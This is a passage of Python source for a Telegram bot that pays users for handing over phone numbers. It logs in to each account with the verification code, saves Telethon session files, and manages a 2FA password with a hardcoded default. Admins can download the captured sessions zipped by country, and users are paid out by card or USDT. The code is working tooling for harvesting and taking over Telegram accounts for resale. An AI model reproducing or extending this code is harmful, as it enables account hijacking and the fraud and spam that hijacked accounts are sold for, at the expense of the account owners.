        bot.send_message(message.chat.id, f"❌ Withdrawal failed. Minimum withdrawal amount is ${MIN_WITHDRAW:.2f}. Your current balance is ${balance:.2f}.")
        return
    markup = types.InlineKeyboardMarkup()
    ld_card_button = types.InlineKeyboardButton("💳 LD Card", callback_data="withdraw_ld_card")
    usdt_button = types.InlineKeyboardButton("USDT (BP20)", callback_data="withdraw_usdt")
    markup.add(ld_card_button, usdt_button)
    bot.send_message(message.chat.id, "Please select your preferred withdrawal method:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("withdraw_"))
@channel_join_required
def withdraw_callback_handler(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    action = call.data.replace("withdraw_", "")
    logging.info(f"[LOG] Withdraw callback triggered: action={action}, chat_id={chat_id}, message_id={message_id}")

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (chat_id,))
    balance_res = cursor.fetchone()
    conn.close()

    if not balance_res:
        logging.error(f"[ERROR] No balance found for user: {chat_id}")
        try:
            bot.answer_callback_query(call.id, "Error: User account not found.", show_alert=True)
        except Exception as e:
            logging.error(f"[ERROR] Failed to send callback answer: {e}")
        return

    balance = balance_res[0]
    logging.info(f"[LOG] User balance: {balance}")

    if action == "ld_card":
        try:
            user_data[chat_id] = {"state": "awaiting_wallet_card_info", "amount": balance, "method": "ld_card"}
            logging.info(f"[LOG] Set user_data for chat_id={chat_id}: {user_data[chat_id]}")
            try:
                bot.edit_message_text("✅ Please provide your card information:", chat_id, message_id, parse_mode="Markdown")
                logging.info(f"[LOG] Successfully edited message for LD Card: chat_id={chat_id}, message_id={message_id}")
            except Exception as e:
                logging.error(f"[ERROR] Failed to edit message for LD Card: {e}")
                bot.send_message(chat_id, "✅ Please provide your card information:", parse_mode="Markdown")
                logging.info(f"[LOG] Sent new message as fallback for LD Card: chat_id={chat_id}")
            bot.answer_callback_query(call.id)
        except Exception as e:
            logging.error(f"[ERROR] Failed to process LD Card callback for chat_id={chat_id}: {e}")
            try:
                bot.answer_callback_query(call.id, "Error processing request. Please try again.", show_alert=True)
                bot.send_message(chat_id, "❌ Failed to process LD Card request. Please try again.")
            except Exception as e2:
                logging.error(f"[ERROR] Failed to send error message: {e2}")
    elif action == "usdt":
        try:
            user_data[chat_id] = {"state": "awaiting_usdt_address", "method": "usdt", "amount": balance}
            logging.info(f"[LOG] Set user_data for USDT: {user_data[chat_id]}")
            try:
                bot.edit_message_text("Please provide your USDT wallet address (BEP-20 network):", chat_id, message_id, parse_mode="Markdown")
                logging.info(f"[LOG] Successfully edited message for USDT: chat_id={chat_id}, message_id={message_id}")
            except Exception as e:
                logging.error(f"[ERROR] Failed to edit message for USDT: {e}")
                bot.send_message(chat_id, "Please provide your USDT wallet address (BEP-20 network):", parse_mode="Markdown")
                logging.info(f"[LOG] Sent new message as fallback for USDT: chat_id={chat_id}")
            bot.answer_callback_query(call.id)
        except Exception as e:
            logging.error(f"[ERROR] Failed to process USDT callback for chat_id={chat_id}: {e}")
            try:
                bot.answer_callback_query(call.id, "Error processing request. Please try again.", show_alert=True)
                bot.send_message(chat_id, "❌ Failed to process USDT request. Please try again.")
            except Exception as e2:
                logging.error(f"[ERROR] Failed to send error message: {e2}")

@bot.message_handler(func=lambda m: not m.text.startswith("/"))
@channel_join_required
def text_message_handler(message):
    chat_id = message.chat.id
    text = message.text.strip()
    if user_data.get(chat_id) is None:
        user_data[chat_id] = {}
    if is_admin(chat_id) and user_data.get(chat_id):
        state = user_data[chat_id].get("state")
        if state == "awaiting_rate": admin_process_set_rate(message); return
        if state == "awaiting_capacity": admin_process_set_capacity(message); return
        if state == "awaiting_toggle": admin_process_toggle_status(message); return
        if state == "awaiting_broadcast": admin_process_broadcast(message); return
        if state == "awaiting_addbalance_info": admin_process_balance_change(message, "add"); return
        if state == "awaiting_removebalance_info": admin_process_balance_change(message, "remove"); return
        if state == "awaiting_addadmin_id": admin_process_admin_change(message, "add"); return
        if state == "awaiting_removeadmin_id": admin_process_admin_change(message, "remove"); return
        if state == "awaiting_new_2fa_password": admin_process_change_2fa_password(message); return
    if user_data.get(chat_id):
        state = user_data[chat_id].get("state")
        if state == "awaiting_wallet_card_info":
            process_wallet_card_info(message)
            return
        elif state == "awaiting_usdt_address":
            process_usdt_withdrawal(message)
            return
        elif state == "awaiting_code" and re.match(r"^\d{5}$", text):
            data = user_data[chat_id]
            phone = data["phone"]
            code = text
            if "code_msg_id" in data:
                processing_msg_id = data["code_msg_id"]
                bot.edit_message_text("⚙️ Processing your request, please wait...", chat_id, processing_msg_id)
            else:
                processing_msg = bot.send_message(chat_id, "⚙️ Processing your request, please wait...")
                processing_msg_id = processing_msg.message_id
            threading.Thread(target=run_telethon_task, args=[_generate_session_file, chat_id, phone, code, data["phone_code_hash"], data["session_filename"], processing_msg_id]).start()
            return
    if re.compile(r"^\+\d{7,15}$").match(text):
        process_phone_number(message)
        return
    if re.match(r"^\d{5}$", text):
        if message.reply_to_message:
            replied_text = message.reply_to_message.text
            match = re.search(r"Verification code has been sent to: (\+\d+)", replied_text)
            if match:
                phone = match.group(1)
                if chat_id in user_data and "phone_code_hash" in user_data[chat_id] and user_data[chat_id]["state"] == "awaiting_code" and phone == user_data[chat_id]["phone"]:
                    data = user_data[chat_id]
                    code = text
                    try:
                        bot.edit_message_text("⚙️ Processing your request, please wait...", chat_id, message.reply_to_message.message_id)
                        processing_msg_id = message.reply_to_message.message_id
                    except Exception as e:
                        logging.error(f"Error editing message: {e}")
                        processing_msg = bot.reply_to(message, "⚙️ Processing your request, please wait...")
                        processing_msg_id = processing_msg.message_id
                    threading.Thread(target=run_telethon_task, args=[_generate_session_file, chat_id, phone, code, data["phone_code_hash"], data["session_filename"], processing_msg_id]).start()
                    return
        else:
            data = user_data.get(chat_id, {})
            if data.get("state") == "awaiting_code":
                phone = data["phone"]
                code = text
                if "code_msg_id" in data:
                    processing_msg_id = data["code_msg_id"]
                    bot.edit_message_text("⚙️ Processing your request, please wait...", chat_id, processing_msg_id)
                else:
                    processing_msg = bot.send_message(chat_id, "⚙️ Processing your request, please wait...")
                    processing_msg_id = processing_msg.message_id
                threading.Thread(target=run_telethon_task, args=[_generate_session_file, chat_id, phone, code, data["phone_code_hash"], data["session_filename"], processing_msg_id]).start()
                return
    send_welcome(message)

def process_phone_number(message):
    chat_id = message.chat.id
    phone_number = message.text.strip()
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    if cursor.execute("SELECT 1 FROM used_numbers WHERE phone_number = ?", (phone_number,)).fetchone():
        bot.send_message(chat_id, "❗️ This phone number has already been registered in our system.")
        conn.close()
        return
    country_code = get_country_info(phone_number)["code"]
    if country_code:
        cursor.execute("SELECT capacity, usage_count FROM country_rates WHERE country_code = ? AND status = 'on'", (country_code,))
        rate_info = cursor.fetchone()
        if not rate_info:
            bot.send_message(chat_id, f"❕ Service is currently unavailable for numbers from {country_code}.")
            conn.close()
            return
        capacity, usage = rate_info
        if usage >= capacity:
            bot.send_message(chat_id, f"❕ Service capacity for {country_code} has been reached. Please try again later.")
            conn.close()
            return
    else:
        bot.send_message(chat_id, "❌ Unable to verify country information for this phone number.")
        conn.close()
        return
    conn.close()
    processing_msg = bot.send_message(chat_id, "⚙️ Processing your number, please wait...")
    threading.Thread(target=run_telethon_task, args=[send_login_code, chat_id, phone_number, processing_msg.message_id]).start()

def process_wallet_card_info(message):
    chat_id = message.chat.id
    data = user_data.get(chat_id, {})
    amount = data.get("amount")
    unescaped_card_info = message.text.strip()
    card_info = escape(unescaped_card_info)
    user_name_from_tg = message.from_user.first_name
    user_username = f"@{escape(message.from_user.username)}" if message.from_user.username else "Not provided"

    if not amount:
        bot.send_message(chat_id, "An error occurred. Please initiate the withdrawal process again using /withdraw.")
        if chat_id in user_data: del user_data[chat_id]
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = 0, verified_count = 0, unverified_count = 0 WHERE user_id = ?", (chat_id,))
    cursor.execute("SELECT claimed_numbers FROM users WHERE user_id = ?", (chat_id,))
    numbers_str_tuple = cursor.fetchone()
    numbers_str = numbers_str_tuple[0] if numbers_str_tuple else ""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, trans_no, transaction_id, currency) VALUES (?, ?, ?, ?, NULL, NULL, 'LD Card')", (chat_id, amount, unescaped_card_info, timestamp))
    conn.commit()
    conn.close()

    user_id = message.from_user.id
    now = datetime.datetime.now()
    user_message = (f"🎉 **Withdrawal Request Submitted Successfully**\n\n"
                    f"📝 **Transaction Details:**\n"
                    f"- Card Information: `{card_info}`\n"
                    f"- User ID: `{user_id}`\n"
                    f"- Username: `{user_username}`\n"
                    f"- Amount: ${amount:.2f}\n\n"
                    f"📅 **Date:** {now.strftime('%d/%m/%Y')}\n"
                    f"⏰ **Time:** {now.strftime('%I:%M %p')}\n\n"
                    f"✅ Your request has been forwarded for processing. Please allow 24-48 hours for completion.")
    try:
        bot.send_message(chat_id, user_message, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Error sending user confirmation (MD): {e}")
        try:
            bot.send_message(chat_id, user_message.replace("*", "").replace("`", ""))
        except Exception as e2:
            logging.error(f"Error sending user confirmation (Plain): {e2}")

    amount_trx = amount * USD_TO_TRX
    amount_bdt = amount * USD_TO_BDT
    amount_pkr = amount * USD_TO_PKR
    country_counts_str = "No accounts claimed yet."
    number_list = []
    if numbers_str:
        number_list = [n for n in numbers_str.strip(",").split(",") if n]
        dial_codes = [get_country_info(num)["dial_code"] for num in number_list]
        counts = Counter(dial_codes)
        country_lines = []
        for dial_code, count in counts.items():
            if not dial_code: continue
            try:
                country_name = ""
                for c in pycountry.countries:
                    try:
                        if country_code_for_region(c.alpha_2) == str(dial_code): country_name = c.name; break
                    except: continue
                country_lines.append(f"+{dial_code} {escape(country_name)} => {count}")
            except:
                country_lines.append(f"+{dial_code} (Unknown) => {count}")
        if country_lines: country_counts_str = "\n".join(country_lines)

    admin_notification = (f"🌳 **New Withdrawal Request**\n\n"
                         f"📋 **User Information:**\n"
                         f"- Name: `{escape(user_name_from_tg)}`\n"
                         f"- ID: `{user_id}`\n"
                         f"- Username: `{user_username}`\n\n"
                         f"💰 **Amount Details:**\n"
                         f"- USD: ${amount:.2f}\n"
                         f"- TRX: {amount_trx:.2f}\n"
                         f"- BDT: {amount_bdt:.2f}\n"
                         f"- PKR: {amount_pkr:.2f}\n\n"
                         f"💳 **Card Information:** `{card_info}`\n\n"
                         f"📅 **Date:** {now.strftime('%d/%m/%Y')}\n"
                         f"⏰ **Time:** {now.strftime('%I:%M %p')}\n\n"
                         f"🌐 **Accounts Processed:** {len(number_list)}\n{country_counts_str}")
    try:
        sent_message = bot.send_message(WITHDRAW_GROUP_ID, admin_notification, parse_mode="Markdown")
        logging.info(f"Admin notification sent successfully to Withdraw Group (Message ID: {sent_message.message_id})")
    except telebot.apihelper.ApiTelegramException as e:
        logging.error(f"Error sending admin notification to Withdraw Group: {e}")
        bot.send_message(chat_id, "❌ Failed to submit withdrawal request. Please contact support.")
    except Exception as e:
        logging.error(f"Unexpected error sending admin notification: {e}")
        bot.send_message(chat_id, "❌ An unexpected error occurred. Please contact support.")

    if chat_id in user_data: del user_data[chat_id]

def process_usdt_withdrawal(message):
    chat_id = message.chat.id
    data = user_data.get(chat_id, {})
    amount = data.get("amount")
    address = message.text.strip()
    user_name_from_tg = message.from_user.first_name
    user_username = f"@{escape(message.from_user.username)}" if message.from_user.username else "Not provided"

    if not amount:
        bot.send_message(chat_id, "An error occurred. Please initiate the withdrawal process again using /withdraw.")
        if chat_id in user_data: del user_data[chat_id]
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    trans_no = generate_trans_no()
    transaction_id = generate_transaction_id()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, trans_no, transaction_id, currency) VALUES (?, ?, ?, ?, ?, ?, 'USDT (BP20)')", (chat_id, amount, address, timestamp, trans_no, transaction_id))
    conn.commit()
    conn.close()

    user_message = (f"✅ Withdrawal request submitted successfully. Please allow 24-48 hours for processing.\n\n"
                   f"**Transaction Reference:** {trans_no}")
    bot.send_message(chat_id, user_message, parse_mode="Markdown")

    admin_message = (f"📢 **New USDT Withdrawal Request**\n\n"
                    f"**Transaction Reference:** {trans_no}\n"
                    f"- Currency: USDT (BEP-20)\n"
                    f"- Amount: ${amount:.2f}\n"
                    f"- Wallet Address: {address}\n"
                    f"- Transaction ID: {transaction_id}\n")
    markup = types.InlineKeyboardMarkup()
    confirm_button = types.InlineKeyboardButton("Confirm Processing", callback_data=f"confirm_withdraw_{trans_no}")
    markup.add(confirm_button)
    bot.send_message(WITHDRAW_GROUP_ID, admin_message, reply_markup=markup, parse_mode="Markdown")

    if chat_id in user_data: del user_data[chat_id]

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_withdraw_"))
@channel_join_required
def confirm_withdraw_callback(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    trans_no = call.data.split("_")[2]
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, amount, address, transaction_id FROM withdraw_history WHERE trans_no = ? AND currency = 'USDT (BP20)'", (trans_no,))
    withdraw_info = cursor.fetchone()
    if withdraw_info:
        user_id, amount, address, transaction_id = withdraw_info
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        current_balance = cursor.fetchone()[0]
        new_balance = current_balance - amount
        cursor.execute("UPDATE users SET balance = ?, verified_count = 0, unverified_count = 0 WHERE user_id = ?", (new_balance, user_id))
        conn.commit()
        conn.close()

        user_message = (f"✅ **Withdrawal Processed Successfully**\n\n"
                       f"**Transaction Reference:** {trans_no}\n"
                       f"- Remaining Balance: ${new_balance:.2f}\n"
                       f"- Currency: USDT (BEP-20)\n"
                       f"- Amount: ${amount:.2f}\n"
                       f"- Wallet Address: {address}\n"
                       f"- Transaction ID: {transaction_id}")
        bot.send_message(user_id, user_message, parse_mode="Markdown")
        bot.delete_message(chat_id, message_id)

@bot.message_handler(commands=["withdrawhistory"])
@channel_join_required
def command_withdrawhistory(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT SUM(amount), COUNT(withdraw_id) FROM withdraw_history WHERE user_id = ?", (message.from_user.id,))
    result = cursor.fetchone()
    conn.close()
    total_withdrawn = result[0] if result and result[0] else 0
    total_requests = result[1] if result and result[1] else 0
    summary = (f"💰 **Withdrawal History Summary**\n\n"
               f"💸 **Total Withdrawn:** ${total_withdrawn:.2f}\n"
               f"📬 **Total Requests:** {total_requests}")
    bot.send_message(message.chat.id, summary, parse_mode="Markdown")

@bot.message_handler(commands=["cancel"])
@channel_join_required
def command_cancel(message):
    if user_data.pop(message.chat.id, None):
        bot.send_message(message.chat.id, "✅ Operation cancelled successfully.")
    else:
        bot.send_message(message.chat.id, "No active operation to cancel.")

# Admin commands and functions
@bot.message_handler(commands=["admin"])
def admin_command_handler(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ Access denied. Administrator privileges required.")
        return
    admin_panel(message)

def admin_panel(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    total_users = cursor.execute("SELECT COUNT(user_id) FROM users").fetchone()[0]
    cursor.execute("SELECT value FROM settings WHERE key = '2fa_password'")
    twofa_password_tuple = cursor.fetchone()
    current_password = twofa_password_tuple[0] if twofa_password_tuple else "@Riyad12"
    conn.close()
    admin_menu_text = f"👋 Welcome, System Administrator\n\n👥 Total Users: {total_users}\n🔐 Current 2FA Password: {current_password}"
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📊 Rate Management", callback_data="admin_rates_menu")
    btn2 = types.InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast")
    btn3 = types.InlineKeyboardButton("💰 Balance Management", callback_data="admin_balance_menu")
    btn4 = types.InlineKeyboardButton("👑 Administrator Management", callback_data="admin_admins_menu")
    btn5 = types.InlineKeyboardButton("📁 Download Session Files", callback_data="admin_sessions_zip")
    btn6 = types.InlineKeyboardButton("🗑️ Clear Session Files", callback_data="admin_clear_sessions")
    btn7 = types.InlineKeyboardButton("🚦 Toggle 2FA", callback_data="admin_toggle_2fa")
    btn8 = types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="admin_change_2fa_password")
    markup.add(btn1, btn2); markup.add(btn3, btn4); markup.add(btn5, btn6); markup.add(btn7, btn8)
    bot.send_message(message.chat.id, admin_menu_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback_handler(call):
    if not is_admin(call.from_user.id): return
    action = call.data.split("_", 1)[1]
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

    if action == "rates_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("✏️ Configure Rates/Timing", callback_data="admin_set_rate"))
        markup.add(types.InlineKeyboardButton("📦 Set Country Capacity", callback_data="admin_set_capacity"))
        markup.add(types.InlineKeyboardButton("🚦 Toggle Country Status", callback_data="admin_toggle_status"))
        markup.add(types.InlineKeyboardButton("⬅️ Back to Main Panel", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "📊 **Rate Management Panel**", reply_markup=markup, parse_mode="Markdown")

    elif action == "set_rate":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        countries = cursor.execute("SELECT country_code FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        country_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}" for c in countries if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Countries in Database:**\n{country_list}\n\nPlease provide configuration in format:\n`CountryName Rate ClaimTime`", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_rate"}

    elif action == "set_capacity":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        capacities = cursor.execute("SELECT country_code, usage_count, capacity FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        capacity_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {c[1]}/{c[2]}" for c in capacities if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Capacity Utilization:**\n{capacity_list}\n\nPlease provide configuration in format:\n`CountryName Capacity`", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_capacity"}

    elif action == "toggle_status":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        statuses = cursor.execute("SELECT country_code, status FROM country_rates ORDER BY country_code").fetchall(); conn.close()
        status_list = "\n".join([f"- {pycountry.countries.get(alpha_2=c[0]).name}: {'✅ Active' if c[1] == 'on' else '❌ Inactive'}" for c in statuses if pycountry.countries.get(alpha_2=c[0])])
        bot.send_message(chat_id, f"**Current Service Status:**\n{status_list}\n\nPlease specify the country name to toggle status.", parse_mode="Markdown")
        user_data[chat_id] = {"state": "awaiting_toggle"}

    elif action == "broadcast":
        bot.send_message(chat_id, "Please enter the message you wish to broadcast to all users."); user_data[chat_id] = {"state": "awaiting_broadcast"}

    elif action == "balance_menu":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Balance", callback_data="admin_add_balance"),
                   types.InlineKeyboardButton("➖ Remove Balance", callback_data="admin_remove_balance"))
        markup.add(types.InlineKeyboardButton("⬅️ Back to Main Panel", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "💰 **Balance Management Panel**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_balance":
        bot.send_message(chat_id, "Please provide: `UserID Amount`"); user_data[chat_id] = {"state": "awaiting_addbalance_info"}
    elif action == "remove_balance":
        bot.send_message(chat_id, "Please provide: `UserID Amount`"); user_data[chat_id] = {"state": "awaiting_removebalance_info"}

    elif action == "admins_menu":
        if call.from_user.id != ADMIN_ID: bot.answer_callback_query(call.id, "❌ Main Administrator access required.", show_alert=True); return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("➕ Add Administrator", callback_data="admin_add_admin"),
                   types.InlineKeyboardButton("➖ Remove Administrator", callback_data="admin_remove_admin"))
        markup.add(types.InlineKeyboardButton("📋 List Administrators", callback_data="admin_list_admins"))
        markup.add(types.InlineKeyboardButton("⬅️ Back to Main Panel", callback_data="admin_main_panel"))
        bot.send_message(chat_id, "👑 **Administrator Management Panel**", reply_markup=markup, parse_mode="Markdown")

    elif action == "add_admin":
        bot.send_message(chat_id, "Please provide the User ID for the new administrator."); user_data[chat_id] = {"state": "awaiting_addadmin_id"}
    elif action == "remove_admin":
        bot.send_message(chat_id, "Please provide the User ID of the administrator to remove."); user_data[chat_id] = {"state": "awaiting_removeadmin_id"}
    elif action == "list_admins":
        list_admins(call.message)

    elif action == "sessions_zip":
        create_and_send_session_zips(chat_id)

    elif action == "clear_sessions":
        show_clear_confirmation(call.message)

    elif action == "confirm_clear_sessions":
        clear_session_files(chat_id)

    elif action == "cancel_clear_sessions":
        bot.send_message(chat_id, "❌ Session file deletion cancelled.")

    elif action == "toggle_2fa":
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM settings WHERE key = '2fa_status'")
        twofa_status_tuple = cursor.fetchone()
        twofa_status = twofa_status_tuple[0] if twofa_status_tuple else "on"
        new_status = "off" if twofa_status == "on" else "on"
        cursor.execute("REPLACE INTO settings (key, value) VALUES ('2fa_status', ?)", (new_status,))
        conn.commit()
        conn.close()
        bot.send_message(chat_id, f"✅ 2FA functionality has been set to {new_status.upper()}.")

    elif action == "change_2fa_password":
        bot.send_message(chat_id, "Please enter the new 2FA password.")
        user_data[chat_id] = {"state": "awaiting_new_2fa_password"}

    elif action == "main_panel":
        admin_panel(call.message)

def create_and_send_session_zips(chat_id):
    country_sessions = {}
    logging.info(f"Checking session files in {SESSIONS_FOLDER}")
    if not os.path.exists(SESSIONS_FOLDER):
        logging.error("Sessions folder does not exist!")
        bot.send_message(chat_id, "❌ Error: Sessions directory not found. Please ensure session files are properly stored.")
        return

    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT phone_number FROM used_numbers")
    claimed_phones = [row[0] for row in cursor.fetchall()]
    conn.close()

    for filename in os.listdir(SESSIONS_FOLDER):
        if filename.endswith(".session"):
            phone_number = filename.replace(".session", "")
            if phone_number in claimed_phones:
                session_path = os.path.join(SESSIONS_FOLDER, filename)
                logging.info(f"Processing claimed session file: {filename}")
                country_info = get_country_info(phone_number)
                if country_info["code"]:
                    country_code = country_info["code"]
                    country_sessions[country_code] = country_sessions.get(country_code, 0) + 1
                else:
                    logging.warning(f"Could not determine country code for phone number: {phone_number}")

    if not country_sessions:
        bot.send_message(chat_id, "📊 **Session Statistics Report**\n\n❌ No claimed session files found in the system.")
        return

    stat_message = "📊 **Session Statistics Report**\n\n"
    for country_code, count in country_sessions.items():
        flag = "".join(chr(ord(c) + 127397) for c in country_code.upper())
        try:
            country_name = pycountry.countries.get(alpha_2=country_code).name
            dial_code = country_code_for_region(country_code)
            stat_message += f"{flag} {country_name} (+{dial_code}) => {count}\n"
        except Exception as e:
            logging.error(f"Error formatting country {country_code}: {e}")
            stat_message += f"{flag} +{country_code} => {count}\n"
    bot.send_message(chat_id, stat_message, parse_mode="Markdown")

    for country_code, count in country_sessions.items():
        zip_filename = f"+{country_code} Session Files - {count}.zip"
        logging.info(f"Creating ZIP archive: {zip_filename}")
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for filename in os.listdir(SESSIONS_FOLDER):
                if filename.endswith(".session"):
                    phone_number = filename.replace(".session", "")
                    if phone_number in claimed_phones:
                        session_path = os.path.join(SESSIONS_FOLDER, filename)
                        country_info = get_country_info(phone_number)
                        if country_info["code"] == country_code:
                            zipf.write(session_path, arcname=filename)
        if os.path.getsize(zip_filename) > 0:
            with open(zip_filename, "rb") as zip_file:
                bot.send_document(chat_id, zip_file, caption=f"Archive containing {count} session file(s) for +{country_code}")
            os.remove(zip_filename)
        else:
            logging.warning(f"ZIP archive {zip_filename} is empty, not sending.")
            os.remove(zip_filename)

def show_clear_confirmation(message):
    markup = types.InlineKeyboardMarkup()
    yes_button = types.InlineKeyboardButton("Confirm Deletion", callback_data="admin_confirm_clear_sessions")
    no_button = types.InlineKeyboardButton("Cancel", callback_data="admin_cancel_clear_sessions")
    markup.add(yes_button, no_button)
    bot.send_message(message.chat.id, "⚠️ **Confirm Session File Deletion**\n\nAre you sure you want to permanently delete all session files?", reply_markup=markup)

def clear_session_files(chat_id):
    for filename in os.listdir(SESSIONS_FOLDER):
        file_path = os.path.join(SESSIONS_FOLDER, filename)
        if os.path.isfile(file_path):
            os.remove(file_path)
    bot.send_message(chat_id, "✅ All session files have been successfully deleted.")

# Admin processing functions
def admin_process_balance_change(message, action):
    parts = message.text.split()
    if len(parts) != 2: 
        bot.reply_to(message, "Usage: `<user_id> <amount>`")
        return
    try:
        target_user_id = int(parts[0]); amount = float(parts[1])
    except ValueError: 
        bot.reply_to(message, "❌ Invalid User ID or Amount format.")
        return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    if not cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (target_user_id,)).fetchone():
        bot.reply_to(message, f"❌ User with ID {target_user_id} not found in the system."); conn.close(); return
    if action == "add": 
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_user_id)); action_text = "added to"
    else: 
        cursor.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, target_user_id)); action_text = "removed from"
    conn.commit()
    new_balance = cursor.execute("SELECT balance FROM users WHERE user_id = ?", (target_user_id,)).fetchone()[0]
    conn.close()
    bot.reply_to(message, f"✅ Success! ${amount:.2f} has been {action_text} User ID {target_user_id}.\nNew Balance: ${new_balance:.2f}")
    try:
        user_notification = f"ℹ️ **Balance Update Notification**\n\nYour account balance has been adjusted by an administrator.\nAmount: ${amount:.2f} ({action_text} your account)\nCurrent Balance: ${new_balance:.2f}"
        bot.send_message(target_user_id, user_notification, parse_mode="Markdown")
    except Exception as e: 
        logging.error(f"Could not notify user {target_user_id}: {e}")
    if message.chat.id in user_data: 
        del user_data[message.chat.id]

def admin_process_admin_change(message, action):
    if message.from_user.id != ADMIN_ID: 
        bot.reply_to(message, "❌ Main Administrator authorization required.")
        return
    try:
        target_user_id = int(message.text.strip())
    except ValueError: 
        bot.reply_to(message, "❌ Invalid User ID format.")
        return
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    if action == "add":
        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (target_user_id,)); action_text = "added as system administrator"
    else:
        if target_user_id == ADMIN_ID: 
            bot.reply_to(message, "❌ Cannot remove Main Administrator privileges."); conn.close(); return
        cursor.execute("DELETE FROM admins WHERE user_id = ?", (target_user_id,)); action_text = "removed from administrator list"
    conn.commit(); conn.close()
    bot.reply_to(message, f"✅ Success! User {target_user_id} has been {action_text}.")
    if message.chat.id in user_data: 
        del user_data[message.chat.id]

def list_admins(message):
    conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
    admins = cursor.execute("SELECT user_id FROM admins").fetchall(); conn.close()
    admin_list_text = "📋 **Current System Administrators**\n\n"
    for admin_id in admins:
        admin_list_text += f"- {admin_id[0]}{' (Main Administrator)' if admin_id[0] == ADMIN_ID else ''}\n"
    bot.send_message(message.chat.id, admin_list_text, parse_mode="Markdown")

def get_country_code_from_name(country_name):
    try:
        country = pycountry.countries.search_fuzzy(country_name)
        return country[0].alpha_2
    except:
        return None

def admin_process_set_rate(message):
    try:
        parts = message.text.split()
        if len(parts) < 3: 
            bot.reply_to(message, "❌ Invalid format. Please use: `CountryName Rate ClaimTime`")
            return
        rate = float(parts[-2]); claim_time = int(parts[-1]); country_name = " ".join(parts[:-2])
        country_code = get_country_code_from_name(country_name)
        if not country_code: 
            bot.reply_to(message, f"❌ Country not recognized: {country_name}")
            return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        cursor.execute("REPLACE INTO country_rates (country_code, rate, claim_time_seconds, status, capacity, usage_count) VALUES (?, ?, ?, 'on', 10, 0)", (country_code, rate, claim_time)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Configuration updated for {country_name}: Rate=${rate}, Claim Time={claim_time}s.")
    except Exception as e: 
        bot.reply_to(message, f"❌ Configuration Error: {e}")
    finally:
        if message.chat.id in user_data: 
            del user_data[message.chat.id]

def admin_process_set_capacity(message):
    try:
        parts = message.text.split()
        if len(parts) < 2: 
            bot.reply_to(message, "❌ Invalid format. Please use: `CountryName Capacity`")
            return
        capacity = int(parts[-1]); country_name = " ".join(parts[:-1])
        country_code = get_country_code_from_name(country_name)
        if not country_code: 
            bot.reply_to(message, f"❌ Country not recognized: {country_name}")
            return
        conn = sqlite3.connect(DB_FILE, check_same_thread=False); cursor = conn.cursor()
        cursor.execute("UPDATE country_rates SET capacity = ? WHERE country_code = ?", (capacity, country_code)); conn.commit(); conn.close()
        bot.reply_to(message, f"✅ Capacity for {country_name} updated to {capacity}.")
    except Exception as e: 
